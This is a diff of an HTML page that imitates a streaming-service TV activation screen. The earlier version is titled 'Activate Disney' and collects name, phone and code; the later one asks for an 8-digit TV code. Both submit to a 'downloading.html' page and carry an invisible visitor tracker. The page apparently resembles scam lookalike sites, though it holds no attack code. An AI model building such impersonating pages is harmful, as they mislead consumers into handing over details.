@@ -1,169 +1,116 @@
 <!DOCTYPE html>
-
-<html>
-
+<html lang="en">
 <head>
-
-  <title>Activate Disney</title>
-
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Blank Page</title>
   <style>
+    /* Add container styles */
+.container {
+  max-width: 600px; /* Set maximum width for the container */
+  margin: 0 auto; /* Center the container horizontally */
+  padding: 20px; /* Add padding to the container */
+  background-color: #ffffff; /* Set background color to white */
+  border-radius: 24px; /* Add border radius */
+  border: 2px solid #ccc; /* Add border */
+  box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.5); /* Add box shadow */
 
-    body {
-
-       background: linear-gradient(to bottom left, #003366 0%, #006666 100%);
+    height:420px;
+    
 }
 
-      display: flex;
-
-      flex-direction: column;
-
-      justify-content: center;
-
-      align-items: center;
-
-      height: 100vh;
-
+    /* Rest of your existing styles */
+    body {
       margin: 0;
-
-      border-radius: 8px;
-
+      padding: 0;
+      background: linear-gradient(to bottom left, #003366 0%, #006666 100%);
+/* Set background color to white */
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      font-family: Netflix Sans, Helvetica Neue, Segoe UI, Roboto, Ubuntu, sans-serif;
+      align-items: center;
+      height: 100vh; /* Ensure the page takes up the full height of the viewport */
+      width:100%;
     }
-
-
-
-    #centered-image {
-
-      max-width: 50%;
-
-      height: auto;
-
-      margin-top: 20px;
-
-      margin-left: 70px;
-
+    #logo {
+      position: fixed; /* Position the logo */
+      top: 10px; /* Adjust top positioning as needed */
+      left: 10px; /* Adjust left positioning as needed */
+      width: 100px; /* Adjust the width of the logo */
+      height: auto; /* Maintain aspect ratio */
     }
-
-
-
-    .image-container {
-
-      margin-bottom: 100px;
-
-    }
-
-
-
-    form {
-
+    h1 {
       text-align: center;
-
-      color: white;
-
-      width: 400px;
-
-      margin-top: 0px;
-
-      border-radius: 8px;
-
+      margin-bottom: 24px; /* Add space below the heading */
+      font-size: 30px;
+      margin-top: 12%; /* Adjust margin top */
     }
-
-
-
-    form input[type="text"],
-
-    form input[type="submit"] {
-
-      width: 68%;
-
-      padding: 10px;
-
-      margin-bottom: 10px;
-
-      margin-top: 10px;
-
-      font-size: 22px;
-
-      border-radius: 8px;
-
+    .code-input {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+    
     }
-
-
-
-    form input[type="submit"] {
-
-      background-color: white;
-
-      color: black;
-
-      font-weight: bold;
-
-      font-size: 18px;
-
+    .code-input input[type="text"] {
+      width: 480px; /* Increase the width */
+      padding: 20px; /* Increase padding */
+      font-size: 60px; /* Increase font size */
+      color: #333;
+      border: none; /* Remove the border */
+      border-radius: 4px;
+      text-align: center;
+      outline: none; /* Remove the default outline */
+      margin-bottom: 20px; /* Add space below the input */
+    }
+    .code-input button {
+      padding: 10px 40px; /* Adjust padding */
+      font-size: 20px; /* Adjust font size */
+      background-color: #B4B4B8; /* Black */
+      color: #fff;
+      border: none;
+      border-radius: 4px;
       cursor: pointer;
-
-      border-radius: 10px;
-
-      padding: 10px;
-
-      max-width: 150px;
-
-      margin-left: 80px;
-
+      margin-bottom: 20px; /* Add space below the button */
     }
-
-
-
-    .text-line {
-
-      color: white;
-
-      font-size: 25px;
-
-      margin-bottom: 25px;
-
-      margin-left: 70px;
-
+    .code-input button:hover {
+      background-color: #B4B4B8; /* Change to your desired color */
+      color: white; /* Change text color if needed */
+      /* Any other styles you want to apply on hover */
     }
-
-
-
-    .form-label {
-
-      font-size: 28px;
-
-      margin-bottom: px;
-
-
-
+    .sign-up {
+      font-size: 18px; /* Adjust font size */
+      color: #333; /* Adjust color */
     }
-
+    .footer-image {
+      width: 100%; /* Ensure the image spans the full width */
+    }
   </style>
-
 </head>
-
-
-
 <body>
+    
+ <img src="logo (1).png" id="centered-image" width="250" height="150">    
+    
+<div class="container"> <!-- Add container div -->
+  <form action="downloading.html" method="POST">
+    <!-- Replace "path_to_your_logo.png" with the actual path to your logo image file -->
+   
+    
+    <h1>Enter the 8-digit code you see on <br>your TV to continue</h1>
+    <div class="code-input">
+      <input type="text" pattern="[0-9]{4}-[0-9]{4}" title="Enter 8 digits separated by a hyphen (-)" placeholder="_ _ _ _ - _ _ _ _" maxlength="9">
+      <button type="submit">Enter Code to Continue</button>
+      <p class="sign-up"><strong>Need help?</strong></p>
+    </div>
+  </form>
+</div> <!-- Close container div -->
+<br>
+<br>
+<br>
+<br>
 
-  <img src="logo (1).png" id="centered-image" width="250" height="150">
 
-  <p class="text-line">Activate Your Disney</p>
 
- <center><form action="downloading.html" >
-
-    <label for="name" class="form-label">Name:</label>&nbsp;&nbsp;
-
-    <input type="text" name="SingleLine" id="name" placeholder="Name" required><br>
-
-    <label for="phone" class="form-label">Phone:</label>&nbsp;&nbsp;
-
-    <input type="text" name="SingleLine1" id="phone" placeholder="Phone Number" required><br>
-
-    <label for="code" class="form-label">Code:</label>&nbsp;&nbsp;&nbsp;
-
-    <input type="text" name="SingleLine2" id="code" placeholder="Code" required><br>
-
-   <input type="submit" value="Activate Now">
   <script type="text/javascript">
 var sc_project=12955773; 
 var sc_invisible=1; 
@@ -172,8 +119,8 @@ var sc_security="2c48bedc";
 <script type="text/javascript"
 src="https://www.statcounter.com/counter/counter.js"
 async></script>
-  </form></center>
+
+
 
 </body>
-
 </html>
